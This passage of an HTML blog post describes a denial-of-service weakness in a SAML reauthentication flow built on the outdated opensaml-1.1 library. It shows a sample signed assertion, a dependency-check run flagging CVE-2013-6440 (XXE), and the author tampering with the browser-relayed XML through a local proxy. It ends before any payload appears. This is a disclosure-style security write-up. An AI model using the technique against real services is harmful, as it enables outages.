<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Laughing out loud - Malicious Reauthentication | Tales about Software Engineering</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.73.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/css/app.4fc0b62e4b82c997bb0041217cd6b979.css rel=stylesheet><meta property="og:title" content="Laughing out loud - Malicious Reauthentication"><meta property="og:description" content="Background I had found a vulnerability that made it is possible to insert maliciously crafted XML into the SAML payload that a reauthentication application returned to perform a Denial of Service (DoS) attack. The vulnerability came about due to the use of a out-of-date but still widely used library.
The service could have been made to consume a lot of CPU and memory causing it respond very slowly if at all."><meta property="og:type" content="article"><meta property="og:url" content="https://beny23.github.io/posts/laughing_out_loud_malicious_auth/"><meta property="article:published_time" content="2018-06-04T10:02:51+01:00"><meta property="article:modified_time" content="2018-06-04T10:02:51+01:00"><meta itemprop=name content="Laughing out loud - Malicious Reauthentication"><meta itemprop=description content="Background I had found a vulnerability that made it is possible to insert maliciously crafted XML into the SAML payload that a reauthentication application returned to perform a Denial of Service (DoS) attack. The vulnerability came about due to the use of a out-of-date but still widely used library.
The service could have been made to consume a lot of CPU and memory causing it respond very slowly if at all."><meta itemprop=datePublished content="2018-06-04T10:02:51+01:00"><meta itemprop=dateModified content="2018-06-04T10:02:51+01:00"><meta itemprop=wordCount content="665"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Laughing out loud - Malicious Reauthentication"><meta name=twitter:description content="Background I had found a vulnerability that made it is possible to insert maliciously crafted XML into the SAML payload that a reauthentication application returned to perform a Denial of Service (DoS) attack. The vulnerability came about due to the use of a out-of-date but still widely used library.
The service could have been made to consume a lot of CPU and memory causing it respond very slowly if at all."><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-171035600-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class="ma0 avenir bg-near-white production"><header><div class=bg-black><nav class="pv3 ph3 ph4-ns" role=navigation><div class="flex-l justify-between items-center center"><a href=/ class="f3 fw2 hover-white no-underline white-90 dib">Tales about Software Engineering</a><div class="flex-l items-center"><ul class="pl0 mr3"><li class="list f5 f4-ns fw4 dib pr3"><a class="hover-white no-underline white-90" href=/about/ title="About page">About</a></li><li class="list f5 f4-ns fw4 dib pr3"><a class="hover-white no-underline white-90" href=/posts/ title="Blog page">Blog</a></li></ul><a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17h-5.835v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://twitter.com/giskard23 target=_blank class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel=noopener aria-label="follow on Twitter——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30C64 50.568 50.568 64 34 64zM26.354 48.137V27.71h-6.789v20.427H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside class="instapaper_ignoref b helvetica tracked">POSTS</aside><div id=sharing class=mt3><a href="https://www.facebook.com/sharer.php?u=https://beny23.github.io/posts/laughing_out_loud_malicious_auth/" class="facebook no-underline" aria-label="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a href="https://twitter.com/share?url=https://beny23.github.io/posts/laughing_out_loud_malicious_auth/&text=Laughing%20out%20loud%20-%20Malicious%20Reauthentication" class="twitter no-underline" aria-label="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a href="https://www.linkedin.com/shareArticle?mini=true&url=https://beny23.github.io/posts/laughing_out_loud_malicious_auth/&title=Laughing%20out%20loud%20-%20Malicious%20Reauthentication" class="linkedin no-underline" aria-label="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30C64 50.568 50.568 64 34 64zM26.354 48.137V27.71h-6.789v20.427H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 athelas mt3 mb1">Laughing out loud - Malicious Reauthentication</h1><time class="f6 mv4 dib tracked" datetime=2018-06-04T10:02:51+01:00>June 4, 2018</time>
<span class="f6 mv4 dib tracked">- 4 minutes read</span>
<span class="f6 mv4 dib tracked">- 665 words</span></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p><img src=/images/laughing_out_loud_malicious_auth_title.png alt="Laughing out loud"></p><h1 id=background>Background</h1><p>I had found a vulnerability that made it is possible to insert maliciously crafted XML into the SAML payload that a reauthentication application returned to perform a Denial of Service (DoS) attack. The vulnerability came about due to the use of a out-of-date but still widely used library.</p><p>The service could have been made to consume a lot of CPU and memory causing it respond very slowly if at all. Health checks and automatic service restarts would have healed the service but it still would have allowed an attacker to mount a sustained Denial of Service attack without needing a lot of requests.</p><p>This post describes the vulnerability found in the opensaml-1.1 which was used to reauthenticate request. In this instance the reauthentication between apps worked by sending a payload to the reauthentication app, which then revalidated username/password and then returned the payload as a SAML assertion. This would be sent to the browser and POSTed back to the originating app.</p><p>The underlying SAML assertion would look something like that:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-xml data-lang=xml><span style=color:#ff79c6>&lt;Assertion</span> <span style=color:#50fa7b>xmlns=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:assertion&#34;</span> <span style=color:#50fa7b>xmlns:saml=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:assertion&#34;</span>
           <span style=color:#50fa7b>xmlns:samlp=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:protocol&#34;</span> <span style=color:#50fa7b>xmlns:xsd=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/XMLSchema&#34;</span>
           <span style=color:#50fa7b>xmlns:xsi=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style=color:#50fa7b>AssertionID=</span><span style=color:#f1fa8c>&#34;_799fe6f5d865e965f751fb7b5f490530&#34;</span>
           <span style=color:#50fa7b>IssueInstant=</span><span style=color:#f1fa8c>&#34;2018-03-29T13:13:46.244Z&#34;</span> <span style=color:#50fa7b>Issuer=</span><span style=color:#f1fa8c>&#34;redacted.com&#34;</span> <span style=color:#50fa7b>MajorVersion=</span><span style=color:#f1fa8c>&#34;1&#34;</span> <span style=color:#50fa7b>MinorVersion=</span><span style=color:#f1fa8c>&#34;1&#34;</span><span style=color:#ff79c6>&gt;</span>
    <span style=color:#ff79c6>&lt;Conditions</span> <span style=color:#50fa7b>NotBefore=</span><span style=color:#f1fa8c>&#34;2018-03-29T13:13:46.244Z&#34;</span> <span style=color:#50fa7b>NotOnOrAfter=</span><span style=color:#f1fa8c>&#34;2018-03-29T13:24:46.244Z&#34;</span><span style=color:#ff79c6>&gt;&lt;/Conditions&gt;</span>
    <span style=color:#ff79c6>&lt;AuthenticationStatement</span> <span style=color:#50fa7b>AuthenticationInstant=</span><span style=color:#f1fa8c>&#34;2018-03-29T13:13:46.244Z&#34;</span> <span style=color:#50fa7b>AuthenticationMethod=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:am:unspecified&#34;</span><span style=color:#ff79c6>&gt;</span>
        <span style=color:#ff79c6>&lt;Subject&gt;</span>
            <span style=color:#ff79c6>&lt;NameIdentifier</span> <span style=color:#50fa7b>Format=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&#34;</span> <span style=color:#50fa7b>NameQualifier=</span><span style=color:#f1fa8c>&#34;SubjectNameQualifier&#34;</span><span style=color:#ff79c6>&gt;</span>SubjectName<span style=color:#ff79c6>&lt;/NameIdentifier&gt;</span>
        <span style=color:#ff79c6>&lt;/Subject&gt;</span>
    <span style=color:#ff79c6>&lt;/AuthenticationStatement&gt;</span>
    <span style=color:#ff79c6>&lt;AttributeStatement&gt;</span>
        <span style=color:#ff79c6>&lt;Subject&gt;</span>
            <span style=color:#ff79c6>&lt;NameIdentifier</span> <span style=color:#50fa7b>Format=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&#34;</span> <span style=color:#50fa7b>NameQualifier=</span><span style=color:#f1fa8c>&#34;SubjectNameQualifier&#34;</span><span style=color:#ff79c6>&gt;</span>SubjectName<span style=color:#ff79c6>&lt;/NameIdentifier&gt;</span>
        <span style=color:#ff79c6>&lt;/Subject&gt;</span>
        <span style=color:#ff79c6>&lt;Attribute</span> <span style=color:#50fa7b>AttributeName=</span><span style=color:#f1fa8c>&#34;sspayload&#34;</span> <span style=color:#50fa7b>AttributeNamespace=</span><span style=color:#f1fa8c>&#34;http://redacted.com&#34;</span><span style=color:#ff79c6>&gt;</span>
            <span style=color:#ff79c6>&lt;AttributeValue&gt;</span>lHJfAvtsbKuRoknWbaiqTXiP0HUPIk6Iu/JwM5pgsEo=<span style=color:#ff79c6>&lt;/AttributeValue&gt;</span>
        <span style=color:#ff79c6>&lt;/Attribute&gt;</span>
        <span style=color:#ff79c6>&lt;Attribute</span> <span style=color:#50fa7b>AttributeName=</span><span style=color:#f1fa8c>&#34;payload&#34;</span> <span style=color:#50fa7b>AttributeNamespace=</span><span style=color:#f1fa8c>&#34;http://redacted.com&#34;</span><span style=color:#ff79c6>&gt;</span>
            <span style=color:#ff79c6>&lt;AttributeValue&gt;</span>iXNKzPtGTrm...sgl7SDiyanNbt6LwIpePh<span style=color:#ff79c6>&lt;/AttributeValue&gt;</span>
        <span style=color:#ff79c6>&lt;/Attribute&gt;</span>
    <span style=color:#ff79c6>&lt;/AttributeStatement&gt;</span>
    <span style=color:#ff79c6>&lt;ds:Signature</span> <span style=color:#50fa7b>xmlns:ds=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#&#34;</span><span style=color:#ff79c6>&gt;</span>
        <span style=color:#ff79c6>&lt;ds:SignedInfo&gt;</span>
            <span style=color:#ff79c6>&lt;ds:CanonicalizationMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:CanonicalizationMethod&gt;</span>
            <span style=color:#ff79c6>&lt;ds:SignatureMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#hmac-sha1&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:SignatureMethod&gt;</span>
            <span style=color:#ff79c6>&lt;ds:Reference</span> <span style=color:#50fa7b>URI=</span><span style=color:#f1fa8c>&#34;#_799fe6f5d865e965f751fb7b5f490530&#34;</span><span style=color:#ff79c6>&gt;</span>
                <span style=color:#ff79c6>&lt;ds:Transforms&gt;</span>
                    <span style=color:#ff79c6>&lt;ds:Transform</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:Transform&gt;</span>
                    <span style=color:#ff79c6>&lt;ds:Transform</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span><span style=color:#ff79c6>&gt;</span>
                        <span style=color:#ff79c6>&lt;ec:InclusiveNamespaces</span> <span style=color:#50fa7b>xmlns:ec=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span> <span style=color:#50fa7b>PrefixList=</span><span style=color:#f1fa8c>&#34;code ds kind rw saml samlp typens #default xsd xsi&#34;</span><span style=color:#ff79c6>&gt;&lt;/ec:InclusiveNamespaces&gt;</span>
                    <span style=color:#ff79c6>&lt;/ds:Transform&gt;</span>
                <span style=color:#ff79c6>&lt;/ds:Transforms&gt;</span>
                <span style=color:#ff79c6>&lt;ds:DigestMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#sha1&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:DigestMethod&gt;</span>
                <span style=color:#ff79c6>&lt;ds:DigestValue&gt;</span>NObH8OXaRhbv/cIRBNes0Jc5m3c=<span style=color:#ff79c6>&lt;/ds:DigestValue&gt;</span>
            <span style=color:#ff79c6>&lt;/ds:Reference&gt;</span>
        <span style=color:#ff79c6>&lt;/ds:SignedInfo&gt;</span>
        <span style=color:#ff79c6>&lt;ds:SignatureValue&gt;</span>89GMiWLrEWThzKpzeDjnCKjs1hI=<span style=color:#ff79c6>&lt;/ds:SignatureValue&gt;</span>
    <span style=color:#ff79c6>&lt;/ds:Signature&gt;</span>
<span style=color:#ff79c6>&lt;/Assertion&gt;</span>
</code></pre></td></tr></table></div></div><p>so far so good - the XML is protected against tampering by a signature and the payload is encrypted&mldr;</p><h1 id=identifying-a-problem>Identifying a Problem</h1><p>I ran the OWASP dependency checker against the dependencies</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell>$ mvn org.owasp:dependency-check-maven:3.1.1:check
</code></pre></td></tr></table></div></div><p>and found the following vulnerability</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell>Published Vulnerabilities
CVE-2013-6440  suppress
Severity: Medium
CVSS Score: 5.0 <span style=color:#ff79c6>(</span>AV:N/AC:L/Au:N/C:P/I:N/A:N<span style=color:#ff79c6>)</span>
CWE: CWE-200 Information Exposure
The <span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>)</span> BasicParserPool, <span style=color:#ff79c6>(</span>2<span style=color:#ff79c6>)</span> StaticBasicParserPool, <span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>)</span> XML Decrypter, and <span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>)</span> SAML Decrypter in Shibboleth OpenSAML-Java before 2.6.1 <span style=color:#8be9fd;font-style:italic>set</span> the expandEntityReferences property to true, which allows remote attackers to conduct XML external entity <span style=color:#ff79c6>(</span>XXE<span style=color:#ff79c6>)</span> attacks via a crafted XML DOCTYPE declaration.
</code></pre></td></tr></table></div></div><p>This led me to perform experiments trying to exploit XXE - considering the XML is passed through the browser (so an attacker can modify the XML)</p><h1 id=the-attack>The Attack</h1><p>I used <a href=https://www.charlesproxy.com>Charles proxy</a> to set a breakpoint on the URL POSTing (I was testing this locally) and I modified the payload before it was POSTed back to the app that initiated the reauthentication</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
